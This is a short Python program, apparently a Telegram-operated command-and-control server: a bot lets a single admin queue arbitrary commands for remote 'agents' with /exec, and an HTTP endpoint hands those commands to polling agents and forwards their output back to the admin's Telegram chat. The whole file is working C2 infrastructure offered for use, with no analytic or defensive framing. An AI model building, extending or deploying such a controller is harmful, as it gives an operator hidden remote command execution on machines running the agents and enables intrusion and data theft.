import asyncio
import os
import logging
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiohttp import web
import requests

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "0"))

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

pending_commands = {}

@dp.message(Command("start"))
async def start_cmd(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer("Доступ запрещён.")
        return
    await message.answer("Бот активен. Команды:\n/agents\n/exec <agent_id> <cmd>")

@dp.message(Command("agents"))
async def list_agents(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    await message.answer("Активные агенты: пока не реализовано")

@dp.message(Command("exec"))
async def exec_cmd(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        await message.answer("Использование: /exec <agent_id> <команда>")
        return
    _, agent_id, cmd = parts
    pending_commands[agent_id] = cmd
    await message.answer(f"Команда поставлена в очередь для {agent_id}")

async def handle_agent_poll(request):
    data = await request.json()
    agent_id = data.get('agent_id')
    if not agent_id:
        return web.json_response({'error': 'no agent_id'}, status=400)
    if 'result' in data:
        result_text = data['result'][:4000]
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {'chat_id': ADMIN_ID, 'text': f"Результат от {agent_id}:\n{result_text}"}
        requests.post(url, json=payload)
        return web.json_response({'status': 'ok'})
    cmd = pending_commands.pop(agent_id, None)
    return web.json_response({'command': cmd})

async def run_http_server():
    app = web.Application()
    app.router.add_post('/agent_poll', handle_agent_poll)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('PORT', 8080))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()
    logging.info(f"HTTP сервер запущен на порту {port}")

async def main():
    asyncio.create_task(run_http_server())
    await dp.start_polling(bot)

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
